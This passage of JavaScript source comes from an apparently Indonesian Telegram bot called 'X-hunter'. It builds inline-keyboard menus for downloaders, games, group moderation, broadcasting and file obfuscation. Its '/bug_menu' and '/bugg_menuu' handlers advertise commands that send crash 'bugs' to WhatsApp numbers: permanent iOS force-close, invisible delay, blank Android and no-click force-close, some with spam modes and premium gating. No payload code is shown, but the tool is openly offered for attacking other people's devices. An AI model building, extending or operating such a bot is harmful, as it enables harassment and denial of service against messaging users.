⬡═—⊱ 𝖲𝖤𝖫𝖫𝖤𝖢𝖳 𝖡𝖴𝖳𝖳𝖮𝖭 ⊰—═⬡
\`\`\``;

  const keyboard = [
        [        
            { text: "𝖠𝖳𝖳𝖠𝖢𝖪 MENU", callback_data: "/bug_menu", style: "danger", icon_custom_emoji_id:  "4958642964181025908" },
            { text: "𝖲𝖤𝖳𝖳𝖨𝖭𝖦 MENU" , callback_data: "/setting_menu", style: "success", icon_custom_emoji_id:  "4956285860359177035" }
        ],
        [
            { text: "𝖳𝖧𝖠𝖭𝖪𝖲 TOO" , callback_data: "/thanks_to", style: "Primary", icon_custom_emoji_id:  "4956429969396859866" },
        ],
        [
            { text: "𝖳𝖮𝖮𝖫𝖲 MENU" , callback_data: "/tools_menu", style: "danger", icon_custom_emoji_id:  "5425077563577890102" },
            { text: "𝖦𝖠𝖬𝖤𝖲 MENU" , callback_data: "/games_menu", style: "success", icon_custom_emoji_id:  "6206497372176913599" },
        ],
        [
            { text: "𝖲𝖤𝖢𝖴𝖱𝖨𝖳𝖸 MENU" , callback_data: "/security_menu1", style: "Primary", icon_custom_emoji_id:  "4958900559139570572" }
        ],
        [
            { text: "J𝖠𝖲𝖧𝖤𝖱 MENU" , callback_data: "/jasher_menu", style: "danger", icon_custom_emoji_id:  "5425077563577890102" },
            { text: "𝖤𝖭𝖢𝖱𝖸𝖯𝖳 MENU" , callback_data: "/Encrypt", style: "success", icon_custom_emoji_id:  "4956287101604725699" }
        ],
        [ 
            { text: "𝖢𝖯𝖠𝖭𝖤𝖫 𝖬𝖤𝖭𝖴", callback_data: "/cpanel_menu", style: "Primary", icon_custom_emoji_id:  "4956560549287560231" }
        ],
        [
            { text: "𝖠𝖴𝖳𝖧𝖮𝖱", url: "https://t.me/FadzxGanteng", style: "danger", icon_custom_emoji_id:  "4956420859771225351" },
            { text: "CHANNEL", url: "https://t.me/DaredevilXTeam", style: "success", icon_custom_emoji_id:  "4958686613933655185" }
        ],
        [ 
            { text: "BACK", callback_data: "/start", style: "Primary", icon_custom_emoji_id:  "4956276016294135071" }
        ]
    ];

    try {
        await ctx.editMessageCaption(all_menuMenu, {
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di all_menu menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/bugg_menuu', async (ctx) => {
    const bugg_menuuMenu = `\`\`\`js
#- 𝘉 𝘜 𝘎  𝘟 𝘏 𝘜 𝘕 𝘛 𝘌 𝘙  -  𝘔 𝘌 𝘕 𝘜

"一緒 Invisible Menu ᯤ",
/hunterfadzx - 628xx [BEBAS SPAM DELAY INVISIBLE]
/brutaldelay - 628xx [INVIS DELAY HARD AGAK RAWAN KENON]
"一緒 Blank Menu ᯤ",
/xhubterzx - 628xx [BLANK NO CLICK WORK ANDRO 16+]
"一緒 Iphone Menu ᯤ",
/iosxxsixc - 628xx [FORCLOSE IOS PERMANEN NOT INVISIBLE]
/supervoid - 628xx [BEBAS SPAM FC IOS ANTI KENON]
"一緒 Forclose Menu ᯤ",
/shipterzx - 628xx [FC NO CLICK WORK ALL ANDROID]
"一緒 Visible Menu ᯤ",
/visibum - 628xx [DELAY VISIBLE]
\`\`\``;

    const keyboard = [
        [
            { text: "ᐯ丨尺ㄩ丂 卂ㄒㄒ卂匚Ҝ", callback_data: "/bugg_menuu", style: "Primary", icon_custom_emoji_id:  "5425077563577890102" },
            { text: "丂乇ㄒㄒ丨几Ꮆ丂  爪乇几ㄩ", callback_data: "/settings_menu", style: "success", icon_custom_emoji_id:  "5350725709679584478" }
        ],
        [
            { text: "Ҝ乇爪乃卂ㄥ丨", callback_data: "/start", style: "danger", icon_custom_emoji_id:  "5352759161945867747" }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugg_menuuMenu, {
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di bugg_menuu menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/bug_menu', async (ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "YES" : "NO";
    const senderStatus = isWhatsAppConnected ? "ACTIVE" : "NO";
    const runtimeStatus = formatRuntime();
    const bug_menuMenu = `\`\`\`js
( 🕊️ ) ─ ＸＨＵＮＴＥＲ 
/*𖤍 ご利用いただきありがとうございます X-hunter スクリプトのバグ Telegram Ϟ*/

⬡═—⊱ 𝖨𝖭𝖥𝖮𝖱𝖬𝖠𝖳𝖨𝖮𝖭 𝖡𝖮𝖳 ⊰—═⬡
AUTHOR = "@FadzxGanteng"
PENGGUNA = "@${ctx.from.username || "Tidak Ada"}"
VERSION = "15.00 Latest"
TYPE = "(Telegraf)"
DATABASE = "Ghitub"
OTP SYSTEM = "ACTIVE"
SESSIONS = "${senderStatus}"
PREMIUM = "${premiumStatus}"
RUNTIME = "${runtimeStatus}"

/*⬡═—⊱ 𝖲𝖸𝖲𝖳𝖤𝖬 𝖡𝖴𝖦 𝖠𝖵𝖠𝖨𝖫𝖠𝖡𝖫𝖤 ⊰—═⬡*/ 
"/iosxxsixc" = Fc Ios Permanent 
"/visibum" = Delay Visible
"/xhubterzx" = Blank Andro
"/shipterzx" = Fc No Click 

⬡═—⊱ 𝖲𝖸𝖲𝖳𝖤𝖬 𝖡𝖤𝖡𝖠𝖲 𝖲𝖯𝖠𝖬 ⊰—═⬡
"/hunterfadzx" = Delay Invisible 
"/supervoid" = Delay Invisible Hard 
"/brutaldelay" = Fc Ios invis 

⬡═—⊱ 𝖲𝖤𝖫𝖫𝖤𝖢𝖳 𝖡𝖴𝖳𝖳𝖮𝖭 ⊰—═⬡
\`\`\``;

    const keyboard = [
        [
            { text: "Kembali", callback_data: "/all_menu", style: "Danger", icon_custom_emoji_id:  "5352759161945867747" }
        ]
    ];

    try {
        await ctx.editMessageCaption(bug_menuMenu, {
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di bug_menu menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/settings_menu', async (ctx) => {
    const settings_menuMenu = `\`\`\`js
#- 𝘚 𝘌 𝘛 𝘛 𝘐 𝘕 𝘎  𝘖 𝘞 𝘕 𝘌 𝘙  -  𝘔 𝘌 𝘕 𝘜

"一緒 Setting Menu Xhunter ᯤ",
/addpremgrup - [ADD ALL MEMB KE AKSES PREMIUM SEMUA]
/delpremgrup - [DELETE ALL AKSES PREMIUM GROUP]
/unblockcmd - [MEMBUKA COMMAND BUG YANG DU KUNCI]
/blockcmd - [MENGUNCI COMMAND BUG]
/listblockcmd - [LIST COMAND BUG YANG DI KUNCI]
/listpremgrup - [MENAMPILKAN LIST GROUP YANG PREMIUM]
/approved - [BUAT MENGIZINKAN BOT MENGAKSES GROUP]
/unapproved - [DELETE IZIN GROUP YANG UDAH DI AKSES BOT]
/listapprovedgroup - [LIST GROUP YANG DI IZINKAN]
/addpairing 628xx - [ADDSENDER NUMBER]
/killsession 628xx - [DELSENDER NUMBER]
\`\`\``;

    const keyboard = [
        [
            { text: "ᐯ丨尺ㄩ丂 卂ㄒㄒ卂匚Ҝ", callback_data: "/bugg_menuu", style: "Primary", icon_custom_emoji_id:  "5425077563577890102" },
            { text: "丂乇ㄒㄒ丨几Ꮆ丂  爪乇几ㄩ", callback_data: "/settings_menu", style: "success", icon_custom_emoji_id:  "5350725709679584478" }
        ],
        [
            { text: "Ҝ乇爪乃卂ㄥ丨", callback_data: "/start", style: "danger", icon_custom_emoji_id:  "5352759161945867747" }
        ]
    ];

    try {
        await ctx.editMessageCaption(settings_menuMenu, {
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di settings_menu menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/setting_menu', async (ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "YES" : "NO";
    const senderStatus = isWhatsAppConnected ? "ACTIVE" : "NO";
    const runtimeStatus = formatRuntime();
    const setting_menuMenu = `\`\`\`js
( 🕊️ ) ─ ＸＨＵＮＴＥＲ 
/*𖤍 ご利用いただきありがとうございます X-hunter スクリプトのバグ Telegram Ϟ*/

⬡═—⊱ 𝖨𝖭𝖥𝖮𝖱𝖬𝖠𝖳𝖨𝖮𝖭 𝖡𝖮𝖳 ⊰—═⬡
AUTHOR = "@FadzxGanteng"
PENGGUNA = "@${ctx.from.username || "Tidak Ada"}"
VERSION = "15.00 Latest"
TYPE = "(Telegraf)"
DATABASE = "Ghitub"
OTP SYSTEM = "ACTIVE"
SESSIONS = "${senderStatus}"
PREMIUM = "${premiumStatus}"
RUNTIME = "${runtimeStatus}"

⬡═—⊱ 𝖲𝖤𝖳𝖳𝖨𝖭𝖦𝖲 𝖲𝖸𝖲𝖳𝖤𝖬 𝖡𝖮𝖳 ⊰—═⬡
"/addpremgrup" = Premium Group 
"/delpremgrup" = Delete Premium 
"/listpremgrup" = List Premium 
"/addpairing" = Adding sessions
"/killsession" = Reset sessions
"/blockcmd" = block menu
"/unblockcmd" = Unblock menu
"/listblockcmd" = list block menu 
"/approved" = Izinkan group
"/unapproved" = hapus dari izinkan 
"/listapprovedgroup" = list group verified

⬡═—⊱ 𝖲𝖤𝖫𝖫𝖤𝖢𝖳 𝖡𝖴𝖳𝖳𝖮𝖭 ⊰—═⬡
\`\`\``;

    const keyboard = [
        [
            { text: "Kembali", callback_data: "/all_menu", style: "success", icon_custom_emoji_id:  "5352759161945867747" }
        ]
    ];

    try {
        await ctx.editMessageCaption(setting_menuMenu, {
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di setting_menu menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/thanks_to', async (ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "YES" : "NO";
    const senderStatus = isWhatsAppConnected ? "ACTIVE" : "NO";
    const runtimeStatus = formatRuntime();
    const thanks_toMenu = `\`\`\`js
( 🕊️ ) ─ ＸＨＵＮＴＥＲ 
/*𖤍 ご利用いただきありがとうございます X-hunter スクリプトのバグ Telegram Ϟ*/

⬡═—⊱ 𝖨𝖭𝖥𝖮𝖱𝖬𝖠𝖳𝖨𝖮𝖭 𝖡𝖮𝖳 ⊰—═⬡
AUTHOR = "@FadzxGanteng"
PENGGUNA = "@${ctx.from.username || "Tidak Ada"}"
VERSION = "15.00 Latest"
TYPE = "(Telegraf)"
DATABASE = "Ghitub"
OTP SYSTEM = "ACTIVE"
SESSIONS = "${senderStatus}"
PREMIUM = "${premiumStatus}"
RUNTIME = "${runtimeStatus}"

⬡═—⊱ 𝖳𝖧𝖠𝖭𝖪𝖲 𝖳𝖮 𝖪𝖤𝖯𝖠𝖣𝖠 ⊰—═⬡
"@FadzxGanteng" = Developer 
"@SyafitriCUTE" = Ade on 
"@cungpretttr" = Support 
"@ripzzmbut" = Support 
"@senzystur" = my Abang 

⬡═—⊱ 𝖲𝖤𝖫𝖫𝖤𝖢𝖳 𝖡𝖴𝖳𝖳𝖮𝖭 ⊰—═⬡
\`\`\``;

    const keyboard = [
        [
            { text: "Kembali", callback_data: "/all_menu", style: "Primary", icon_custom_emoji_id:  "5352759161945867747" },
        ]
    ];

    try {
        await ctx.editMessageCaption(thanks_toMenu, {
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di thanks_to menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/tools_menu', async (ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "YES" : "NO";
    const senderStatus = isWhatsAppConnected ? "ACTIVE" : "NO";
    const runtimeStatus = formatRuntime();
    const tools_menuMenu = `\`\`\`js
( 🕊️ ) ─ ＸＨＵＮＴＥＲ 
/*𖤍 ご利用いただきありがとうございます X-hunter スクリプトのバグ Telegram Ϟ*/

⬡═—⊱ 𝖨𝖭𝖥𝖮𝖱𝖬𝖠𝖳𝖨𝖮𝖭 𝖡𝖮𝖳 ⊰—═⬡
AUTHOR = "@FadzxGanteng"
PENGGUNA = "@${ctx.from.username || "Tidak Ada"}"
VERSION = "15.00 Latest"
TYPE = "(Telegraf)"
DATABASE = "Ghitub"
OTP SYSTEM = "ACTIVE"
SESSIONS = "${senderStatus}"
PREMIUM = "${premiumStatus}"
RUNTIME = "${runtimeStatus}"

⬡═—⊱ 𝖳𝖮𝖮𝖫𝖲 𝖲𝖸𝖲𝖳𝖤𝖬 𝖬𝖤𝖭𝖴 ⊰—═⬡
"/tiktok" = Dowloader Tiktok 
"/instagram" = Dowloader Instagram
"/facebook" = Dowloader Facebook 
"/youtube" = Dowloader YouTube 
"/cekbio" = Cek Bio WhatsApp 
"/tourl" = Convert foto to Url
"/tourlvideo" = Convert Video to Url
"/quote" = Quote iPhone Style 
"/cuaca" = Check Cuaca hari ini
"/ceknomor" = Check info Nomer 
"/cekwa" = Check Nomer Whatsapp
"/berita" = Check Berita Hari ini

⬡═—⊱ 𝖲𝖤𝖫𝖫𝖤𝖢𝖳 𝖡𝖴𝖳𝖳𝖮𝖭 ⊰—═⬡
\`\`\``;

    const keyboard = [
        [
            { text: "Kembali", callback_data: "/all_menu", style: "danger", icon_custom_emoji_id:  "5352759161945867747" },
        ]
    ];

    try {
        await ctx.editMessageCaption(tools_menuMenu, {
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di tools_menu menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/games_menu', async (ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "YES" : "NO";
    const senderStatus = isWhatsAppConnected ? "ACTIVE" : "NO";
    const runtimeStatus = formatRuntime();
    const games_menuMenu = `\`\`\`js
( 🕊️ ) ─ ＸＨＵＮＴＥＲ 
/*𖤍 ご利用いただきありがとうございます X-hunter スクリプトのバグ Telegram Ϟ*/

⬡═—⊱ 𝖨𝖭𝖥𝖮𝖱𝖬𝖠𝖳𝖨𝖮𝖭 𝖡𝖮𝖳 ⊰—═⬡
AUTHOR = "@FadzxGanteng"
PENGGUNA = "@${ctx.from.username || "Tidak Ada"}"
VERSION = "15.00 Latest"
TYPE = "(Telegraf)"
DATABASE = "Ghitub"
OTP SYSTEM = "ACTIVE"
SESSIONS = "${senderStatus}"
PREMIUM = "${premiumStatus}"
RUNTIME = "${runtimeStatus}"

⬡═—⊱ 𝖦𝖠𝖬𝖤𝖲 𝖲𝖸𝖲𝖳𝖤𝖬 𝖬𝖤𝖭𝖴 ⊰—═⬡
"/ttt" = Game Tic Tac Toe 
"/tttstop" = Stop Game Tic Tac Toe
"/suit" = Game Suit Multiplayer 
"/suitstop" = Stop Game Suit
"/mypoint" = Melihat Your Point
"/leaderboard" = Leaderboard Game

⬡═—⊱ 𝖲𝖤𝖫𝖫𝖤𝖢𝖳 𝖡𝖴𝖳𝖳𝖮𝖭 ⊰—═⬡
\`\`\``;

    const keyboard = [
        [
            { text: "Kembali", callback_data: "/all_menu", style: "success", icon_custom_emoji_id:  "5352759161945867747" },
        ]
    ];

    try {
        await ctx.editMessageCaption(games_menuMenu, {
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di games_menu menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/security_menu1', async (ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "YES" : "NO";
    const senderStatus = isWhatsAppConnected ? "ACTIVE" : "NO";
    const runtimeStatus = formatRuntime();
    const security_menu1Menu = `\`\`\`js
( 🕊️ ) ─ ＸＨＵＮＴＥＲ 
/*𖤍 ご利用いただきありがとうございます X-hunter スクリプトのバグ Telegram Ϟ*/

⬡═—⊱ 𝖨𝖭𝖥𝖮𝖱𝖬𝖠𝖳𝖨𝖮𝖭 𝖡𝖮𝖳 ⊰—═⬡
AUTHOR = "@FadzxGanteng"
PENGGUNA = "@${ctx.from.username || "Tidak Ada"}"
VERSION = "15.00 Latest"
TYPE = "(Telegraf)"
DATABASE = "Ghitub"
OTP SYSTEM = "ACTIVE"
SESSIONS = "${senderStatus}"
PREMIUM = "${premiumStatus}"
RUNTIME = "${runtimeStatus}"

⬡═—⊱ 𝖲𝖤𝖢𝖴𝖱𝖨𝖳𝖸 𝖲𝖸𝖲𝖳𝖤𝖬 𝖦𝖱𝖮𝖴𝖯 1 ⊰—═⬡
"/antilink" = Aktifkan Anti Link
"/antilinkoff" = Nonaktifkan Anti Link
"/antibot" = Aktifkan Anti Bot
"/antibotoff" = Nonaktifkan Anti Bot
"/antinsfw" = Aktifkan Anti kata terlarang 
"/antinsfwoff" = Nonaktifkan Anti kata terlarang 
"/antispam" = Aktifkan Anti Spam
"/antispamoff" = Nonaktifkan Anti Spam
"/antipromosi" = Aktifkan Anti Promosi
"/antipromosioff" = Nonaktifkan Anti Promosi


⬡═—⊱ 𝖲𝖤𝖫𝖫𝖤𝖢𝖳 𝖡𝖴𝖳𝖳𝖮𝖭 ⊰—═⬡
\`\`\``;

    const keyboard = [
        [
            { text: "Next", callback_data: "/security_menu2", style: "success", icon_custom_emoji_id:  "4956282853882069908" },
        ],
        [
            { text: "Kembali", callback_data: "/all_menu", style: "Primary", icon_custom_emoji_id:  "5352759161945867747" },
        ]
    ];

    try {
        await ctx.editMessageCaption(security_menu1Menu, {
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di security_menu1 menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/security_menu2', async (ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "YES" : "NO";
    const senderStatus = isWhatsAppConnected ? "ACTIVE" : "NO";
    const runtimeStatus = formatRuntime();
    const security_menu2Menu = `\`\`\`js
( 🕊️ ) ─ ＸＨＵＮＴＥＲ 
/*𖤍 ご利用いただきありがとうございます X-hunter スクリプトのバグ Telegram Ϟ*/

⬡═—⊱ 𝖨𝖭𝖥𝖮𝖱𝖬𝖠𝖳𝖨𝖮𝖭 𝖡𝖮𝖳 ⊰—═⬡
AUTHOR = "@FadzxGanteng"
PENGGUNA = "@${ctx.from.username || "Tidak Ada"}"
VERSION = "15.00 Latest"
TYPE = "(Telegraf)"
DATABASE = "Ghitub"
OTP SYSTEM = "ACTIVE"
SESSIONS = "${senderStatus}"
PREMIUM = "${premiumStatus}"
RUNTIME = "${runtimeStatus}"

⬡═—⊱ 𝖲𝖤𝖢𝖴𝖱𝖨𝖳𝖸 𝖲𝖸𝖲𝖳𝖤𝖬 𝖦𝖱𝖮𝖴𝖯 2 ⊰—═⬡
"/autodel" = Aktifkan Auto Delete
"/autodeloff" = Nonaktifkan Auto Delete
"/setwelcome" = Aktifkan Set Welcome 
"/welcomeon" = Aktifkan kembali Welcome
"/welcomeoff" = Nonaktifkan Set Welcome 
"/getwelcome" = Melihat Set Welcome 
"/setgoodbye" = Aktifkan Set Goodbye 
"/goodbyeoff" = Nonaktifkan Set Goodbye 
"/goodbyeon" = Aktifkan kembali Goodbye 
"/getgoodbye" = Melihat Set Goodbye 


⬡═—⊱ 𝖲𝖤𝖫𝖫𝖤𝖢𝖳 𝖡𝖴𝖳𝖳𝖮𝖭 ⊰—═⬡
\`\`\``;

    const keyboard = [
        [
            { text: "Next", callback_data: "/security_menu3", style: "success", icon_custom_emoji_id:  "4956282853882069908" },
        ],
        [
            { text: "Kembali", callback_data: "/security_menu1", style: "Primary", icon_custom_emoji_id:  "5352759161945867747" },
        ]
    ];

    try {
        await ctx.editMessageCaption(security_menu2Menu, {
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di security_menu2 menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});


bot.action('/security_menu3', async (ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "YES" : "NO";
    const senderStatus = isWhatsAppConnected ? "ACTIVE" : "NO";
    const runtimeStatus = formatRuntime();
    const security_menu3Menu = `\`\`\`js
( 🕊️ ) ─ ＸＨＵＮＴＥＲ 
/*𖤍 ご利用いただきありがとうございます X-hunter スクリプトのバグ Telegram Ϟ*/

⬡═—⊱ 𝖨𝖭𝖥𝖮𝖱𝖬𝖠𝖳𝖨𝖮𝖭 𝖡𝖮𝖳 ⊰—═⬡
AUTHOR = "@FadzxGanteng"
PENGGUNA = "@${ctx.from.username || "Tidak Ada"}"
VERSION = "15.00 Latest"
TYPE = "(Telegraf)"
DATABASE = "Ghitub"
OTP SYSTEM = "ACTIVE"
SESSIONS = "${senderStatus}"
PREMIUM = "${premiumStatus}"
RUNTIME = "${runtimeStatus}"

⬡═—⊱ 𝖲𝖤𝖢𝖴𝖱𝖨𝖳𝖸 𝖲𝖸𝖲𝖳𝖤𝖬 𝖦𝖱𝖮𝖴𝖯 3 ⊰—═⬡
"/autokick" = Aktifkan Auto Kick 
"/autoban" = Aktifkan Auto Ban
"/autoactionoff" = Nonaktifkan kick/ban
"/aifilter" = Aktifkan AI filter
"/aifilteroff" = Nonaktifkan AI filter 
"/antifake" = Aktifkan Anti Fake Akun
"/antifakeoff" = Nonaktifkan Anti Fake Akun
"/slowmode" = Aktifkan Slow Mode
"/slowmodeoff" = Nonaktifkan Slow Mode

⬡═—⊱ 𝖲𝖤𝖫𝖫𝖤𝖢𝖳 𝖡𝖴𝖳𝖳𝖮𝖭 ⊰—═⬡
\`\`\``;

    const keyboard = [
        [
            { text: "Next", callback_data: "/security_menu4", style: "success", icon_custom_emoji_id:  "4956282853882069908" },
        ],
        [
            { text: "Kembali", callback_data: "/security_menu2", style: "Primary", icon_custom_emoji_id:  "5352759161945867747" },
        ]
    ];

    try {
        await ctx.editMessageCaption(security_menu3Menu, {
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di security_menu3 menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/security_menu4', async (ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "YES" : "NO";
    const senderStatus = isWhatsAppConnected ? "ACTIVE" : "NO";
    const runtimeStatus = formatRuntime();
    const security_menu4Menu = `\`\`\`js
( 🕊️ ) ─ ＸＨＵＮＴＥＲ 
/*𖤍 ご利用いただきありがとうございます X-hunter スクリプトのバグ Telegram Ϟ*/

⬡═—⊱ 𝖨𝖭𝖥𝖮𝖱𝖬𝖠𝖳𝖨𝖮𝖭 𝖡𝖮𝖳 ⊰—═⬡
AUTHOR = "@FadzxGanteng"
PENGGUNA = "@${ctx.from.username || "Tidak Ada"}"
VERSION = "15.00 Latest"
TYPE = "(Telegraf)"
DATABASE = "Ghitub"
OTP SYSTEM = "ACTIVE"
SESSIONS = "${senderStatus}"
PREMIUM = "${premiumStatus}"
RUNTIME = "${runtimeStatus}"

⬡═—⊱ 𝖲𝖤𝖢𝖴𝖱𝖨𝖳𝖸 𝖲𝖸𝖲𝖳𝖤𝖬 𝖦𝖱𝖮𝖴𝖯 4 ⊰—═⬡
"/antiraid" = Aktifkan Anti Member Baru
"/antiraidoff" = Nonaktifkan Anti Member Baru
"/antiraidstatus" = Melihat Status Mode
"/mute" = Mute Member di Group 
"/unmute" = Unmute Member Di Group
"/warn" = Warn Member di Group 
"/warnings" = Melihat total Warn Member
"/unwarn" = Hapus total Warn Member
"/clearwarn" = Hapus Semua Warn Member


⬡═—⊱ 𝖲𝖤𝖫𝖫𝖤𝖢𝖳 𝖡𝖴𝖳𝖳𝖮𝖭 ⊰—═⬡
\`\`\``;

    const keyboard = [
        [
            { text: "Kembali", callback_data: "/security_menu3", style: "Primary", icon_custom_emoji_id:  "5352759161945867747" },
        ]
    ];

    try {
        await ctx.editMessageCaption(security_menu4Menu, {
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di security_menu4 menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/jasher_menu', async (ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "YES" : "NO";
    const senderStatus = isWhatsAppConnected ? "ACTIVE" : "NO";
    const runtimeStatus = formatRuntime();
    const jasher_menuMenu = `\`\`\`js
( 🕊️ ) ─ ＸＨＵＮＴＥＲ 
/*𖤍 ご利用いただきありがとうございます X-hunter スクリプトのバグ Telegram Ϟ*/

⬡═—⊱ 𝖨𝖭𝖥𝖮𝖱𝖬𝖠𝖳𝖨𝖮𝖭 𝖡𝖮𝖳 ⊰—═⬡
AUTHOR = "@FadzxGanteng"
PENGGUNA = "@${ctx.from.username || "Tidak Ada"}"
VERSION = "15.00 Latest"
TYPE = "(Telegraf)"
DATABASE = "Ghitub"
OTP SYSTEM = "ACTIVE"
SESSIONS = "${senderStatus}"
PREMIUM = "${premiumStatus}"
RUNTIME = "${runtimeStatus}"

⬡═—⊱ 𝖩𝖠𝖲𝖧𝖤𝖱 𝖲𝖸𝖲𝖳𝖤𝖬 𝖬𝖤𝖭𝖴 ⊰—═⬡
"/bcuser" = Broadcast User
"/bcgroup" = Broadcast Group
"/bcall" = Broadcast User & Group
"/sharemsg" = Share User Only
"/bcuserreply" = Broadcast type Reply 
"/sharemsgreply" = Share type Reply
"/totalchat" = total chat database 

⬡═—⊱ 𝖲𝖤𝖫𝖫𝖤𝖢𝖳 𝖡𝖴𝖳𝖳𝖮𝖭 ⊰—═⬡
\`\`\``;

    const keyboard = [
        [
            { text: "Kembali", callback_data: "/all_menu", style: "danger", icon_custom_emoji_id:  "5352759161945867747" },
        ]
    ];

    try {
        await ctx.editMessageCaption(jasher_menuMenu, {
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di jasher_menu menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/Encrypt', async (ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "YES" : "NO";
    const senderStatus = isWhatsAppConnected ? "ACTIVE" : "NO";
    const runtimeStatus = formatRuntime();
    const EncryptMenu = `\`\`\`js
( 🕊️ ) ─ ＸＨＵＮＴＥＲ 
/*𖤍 ご利用いただきありがとうございます X-hunter スクリプトのバグ Telegram Ϟ*/

⬡═—⊱ 𝖨𝖭𝖥𝖮𝖱𝖬𝖠𝖳𝖨𝖮𝖭 𝖡𝖮𝖳 ⊰—═⬡
AUTHOR = "@FadzxGanteng"
PENGGUNA = "@${ctx.from.username || "Tidak Ada"}"
VERSION = "15.00 Latest"
TYPE = "(Telegraf)"
DATABASE = "Ghitub"
OTP SYSTEM = "ACTIVE"
SESSIONS = "${senderStatus}"
PREMIUM = "${premiumStatus}"
RUNTIME = "${runtimeStatus}"

⬡═—⊱ 𝖤𝖭𝖢𝖱𝖸𝖯𝖳 𝖥𝖨𝖫𝖤𝖲 𝖬𝖤𝖭𝖴 ⊰—═⬡
"/rosemary" = Super Aggressive Enc 
"/hardcore" = Anti Debugging Enc
"/phantom" = Invisible Strong Enc
"/artillery" = Light Hardening Enc
